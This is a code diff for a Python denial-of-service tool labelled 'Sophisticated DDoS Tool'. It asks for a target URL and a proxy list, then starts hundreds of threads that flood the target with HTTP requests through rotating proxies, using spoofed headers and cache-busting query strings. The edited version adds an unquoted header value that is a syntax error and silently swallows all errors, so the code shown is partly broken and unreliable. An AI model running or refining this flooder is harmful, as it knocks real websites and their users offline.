@@ -8229,110 +8229,99 @@ ua = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.
 			
 
 class Spammer(threading.Thread):
-    def __init__(self, url, thread_id, proxy_list):
+    def __init__(self, url, number, lista):
         threading.Thread.__init__(self)
-        self.url = f"{url}?{random.randint(0, 99999999)}={random.randint(0, 99999999)}"
-        self.thread_id = thread_id
+        self.url = url + "?" + str(random.randint(0, 99999999)) + "=" + str(random.randint(0, 99999999))
+        self.num = number
         self.headers = {
             'User-Agent': random.choice(ua),
-            'Keep-Alive': str(random.randint(110, 9960)),
+            'Keep-Alive': random.randint(110, 9960),
             'Referer': random.choice(ref),
+            'x-Forwarded-For': 8.8.1.1
         }
-        self.proxy_list = proxy_list
-        self.lock = threading.Lock()
-
-    def make_request(self):
+        self.Lock = threading.Lock()
+        self.lista = lista
+    def request(self):
         global N
-        if N >= len(self.proxy_list):
+        data = None
+        if N >= (len(self.lista) - 1):
             N = 0
-        proxy = urllib.request.ProxyHandler({'http': self.proxy_list[N]})
+        proxy = urllib.request.ProxyHandler({'http': self.lista[N]})
         opener = urllib.request.build_opener(proxy)
         urllib.request.install_opener(opener)
-        req = urllib.request.Request(self.url, headers=self.headers)
+        req = urllib.request.Request(self.url, data, self.headers)
         urllib.request.urlopen(req)
-
-        self.display_status(N)
-        N += 1
-
-    def display_status(self, proxy_index):
-        sys.stdout.write(
-            f"\r{Fore.WHITE}Thread #{self.thread_id:4d} | Proxy@{self.proxy_list[proxy_index]}{Style.RESET_ALL}"
-        )
+        print(Fore.RED + "0000000000000000000000000000")
+        print(Fore.YELLOW + "DDoS Attack in Progress")
+        print(Fore.RED + "0000000000000000000000000000")
+        print(Style.RESET_ALL, end="")
+        sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | {N:4d}/{len(self.lista)} | Proxy@{self.lista[N]}")
         sys.stdout.flush()
-
+        sys.stdout.write("\r")
     def run(self):
         global N
-        print(f"Thread #{self.thread_id:4d} initialized.")
+        self.Lock.acquire()
+        print("Thread #%4d |" % self.num)
+        self.Lock.release()
         time.sleep(1)
         while True:
             try:
-                self.make_request()
-            except Exception as e:
-                print(f"Thread #{self.thread_id:4d} encountered an error: {e}")
-
-class MainLoop:
+                N += 1
+                self.request()
+            except:
+                pass
+        sys.exit(0)
+class MainLoop():
     def __init__(self):
-        if os.name in ["nt", "posix", "mac", "linux"]:
-            self.display_banner()
-
-    @staticmethod
-    def display_banner():
-        banner = """
-        +-------------------------------------------------------------+
-        |           Sophisticated DDoS Tool - Team sl0ppyr00t         |
-        |           Press Ctrl+C to stop the attack                   |
-        +-------------------------------------------------------------+
-        """
-        print(Fore.YELLOW + banner + Style.RESET_ALL)
-
-    @staticmethod
-    def check_url(url):
-        if not url.startswith("http"):
-            return f"https://{url}"
+        if os.name in ("nt", "posix", "mac", "os2", "ce", "java", "riscos", "atheos", "amigaos", "beos", "uwin", "vms", "cygwin", "zos", "aix", "irix", "osf1", "hpux", "sunos", "freebsd", "openbsd", "netbsd", "darwin", "linux", "solaris", "haiku", "aros", "syllable", "skyos", "hurd", "minix", "android", "ios", "qnx", "blackberry", "webos", "windowsphone", "windowsce", "symbian", "microsoft", "dec", "sgi", "hp", "sun", "macintosh", "win32", "posix"):
+            self.title()
+    def title(self):
+        sys.stdout.write("                                                                                          \n")
+        sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
+        sys.stdout.write("             " + "0             Sophisticated DDoS Tool        ""          0\n")
+        sys.stdout.write("             " + "0        By Team sl0ppyr00t                ""              0\n")
+        sys.stdout.write("             " + "0        Press Ctrl+C to stop the attack   ""          0\n")
+        sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
+        sys.stdout.write("\n")
+    def check_url(self, url):
+        if url[:4] == "www.":
+            url = "https://" + url
+        elif url[:4] == "http":
+            pass
+        else:
+            url = "https://" + url
         return url
-
     def setup(self):
-        global N
-        N = 0
-
-        # Get the target URL
+        global N, Close, Request, Tot_req
         while True:
-            target_url = input("> Enter the target URL: ").strip()
-            target_url = self.check_url(target_url)
+            print(Fore.RED + "0000000000000000000000000000")
+            print(Fore.YELLOW + "Sophisticated DDoS Tool")
+            print(Fore.RED + "0000000000000000000000000000")
+            print(Style.RESET_ALL)
+            url = input('> Enter the target URL to DoS: ')
+            url = self.check_url(url)
             try:
-                req = urllib.request.Request(target_url, headers={'User-Agent': random.choice(ua)})
-                urllib.request.urlopen(req)
-                print(f"> Target URL validated: {target_url}")
+                req = urllib.request.Request(url, None, {'User-Agent': random.choice(ua)})
+                response = urllib.request.urlopen(req)
                 break
-            except Exception as e:
-                print(f"> Error: {e}")
-
-        # Load the proxy list
-        while True:
-            proxy_file = input("> Enter the path to the proxy list: ").strip()
-            try:
-                with open(proxy_file, 'r') as file:
-                    proxy_list = [line.strip() for line in file if line.strip()]
-                if proxy_list:
-                    print(f"> Loaded {len(proxy_list)} proxies.")
-                    break
-                else:
-                    print("> Proxy list is empty. Try again.")
-            except Exception as e:
-                print(f"> Error reading proxy file: {e}")
-
-        # Get the number of threads
+            except:
+                print('> Could not open the specified URL.')
         while True:
             try:
-                num_threads = int(input("> Enter the number of threads [default: 600]: ") or 600)
+                proxy_file = input('> Enter the path to the proxy list: ')
+                with open(proxy_file, 'r') as in_file:
+                    proxy_list = [i.strip() for i in in_file.readlines()]
                 break
-            except ValueError:
-                print("> Invalid input. Please enter a valid number.")
-
-        # Start threads
-        for thread_id in range(1, num_threads + 1):
-            Spammer(target_url, thread_id, proxy_list).start()
-
+            except:
+                print('Error reading the proxy list file.')
+        while True:
+            try:
+                num_threads = int(input('> Enter the number of threads [600]: ') or '600')
+                break
+            except:
+                print('Invalid input. Please enter a number.')
+        for i in range(num_threads):
+            Spammer(url, i + 1, proxy_list).start()
 if __name__ == '__main__':
     N = 0
     b = MainLoop()
